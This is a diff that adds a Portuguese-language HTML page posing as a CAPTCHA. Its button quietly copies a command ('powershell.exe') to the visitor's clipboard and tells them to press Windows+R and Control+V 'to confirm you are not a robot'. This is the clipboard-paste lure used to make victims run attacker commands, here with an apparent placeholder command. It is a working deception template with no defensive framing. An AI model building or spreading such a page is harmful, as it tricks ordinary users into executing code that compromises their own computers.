@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Captcha Personalizado</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 50px;
+        }
+        #mensagem {
+            display: none; /* Oculta a mensagem inicialmente */
+            margin-top: 10px;
+            font-weight: bold;
+            color: green;
+            line-height: 1.8; /* Ajusta o espaçamento entre as linhas */
+        }
+    </style>
+</head>
+<body>
+
+    <h2>Confirme que você não é um robô</h2>
+    <button onclick="copiarTexto()">Clique para copiar</button>
+
+    <p id="mensagem">
+        Windows + R <br>
+        Control + V <br>
+        para confirmar que não é um robô
+    </p>
+
+    <p id="resultado"></p>
+
+    <script>
+        function copiarTexto() {
+            const comando = "powershell.exe"; // Define o texto que será copiado 
+            
+            navigator.clipboard.writeText(comando).then(() => {
+                // Exibe a mensagem
+                document.getElementById("mensagem").style.display = "block";
+            }).catch(err => {
+                console.error("Erro ao copiar texto: ", err);
+            });
+        }
+    </script>
+
+</body>
+</html>
